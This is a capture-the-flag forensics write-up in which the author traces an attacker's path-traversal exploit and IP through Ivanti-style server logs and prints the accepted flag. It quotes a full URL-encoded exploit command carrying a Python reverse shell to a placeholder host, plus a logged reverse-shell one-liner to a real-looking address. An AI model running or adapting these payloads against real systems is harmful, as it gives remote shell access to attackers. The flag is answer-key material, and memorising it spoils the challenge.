So we're given many log files, and we have to find the CVE used by the attacker and his IP.
In the file "cav_webserv.log", we can see MANY tries for webpages that leads to 404, that looks like Fuzzing.
The ip that did these requests is 172.18.0.4.

The scan has ended around Fri Mar 15 06:42:10 2024, so the exploit is probably after that time.

Inside "nodemonlog", we can find:

![](_attachments/Pasted%20image%2020240407185830.png)
![](_attachments/Pasted%20image%2020240407185837.png)
![](_attachments/Pasted%20image%2020240407185915.png)![](_attachments/Pasted%20image%2020240407185926.png)

Found this in config_rest_server.log.old:
```
[pid: 6299|app: 0|req: 1/1] 172.18.0.4 () {30 vars in 501 bytes} [Fri Mar 15 06:29:17 2024] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 14 bytes in 164281 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)

```

I found this article:
https://blog.cloudflare.com/how-cloudflares-ai-waf-proactively-detected-ivanti-connect-secure-critical-zero-day-vulnerability-fr-fr

It explains that attacker can exploit the vuln using this:

```
curl -ik --path-as-is https://VICTIM/api/v1/totp/user-backup-code/../../license/keys-status/%3Bpython%20%2Dc%20%27import%20socket%2Csubprocess%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22CONNECTBACKIP%22%2CCONNECTBACKPORT%29%29%3Bsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%2Cstdin%3Ds%2Efileno%28%29%2Cstdout%3Ds%2Efileno%28%29%2Cstderr%3Ds%2Efileno%28%29%29%27%3B
```

well it looks much like what we are seeing !

Incorrect:
- FCSC{CVE-2023-46805:172.18.0.4}
- FCSC{CVE-2024-21887:172.18.0.4}

So these aren't the exploit ? Weird... Might be a false positive.

Also, i found this line in logs:
```
22157 22155  0.0  0.0 S  2296   9532  8004 python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```
That's exactly like a reverse shell... What if  ? :)

The attacker IP is 20.13.3.0, without any doubt now.

I retried the exploits from before:
```
FCSC{CVE-2024-21887:20.13.3.0}
```
And this one worked :)

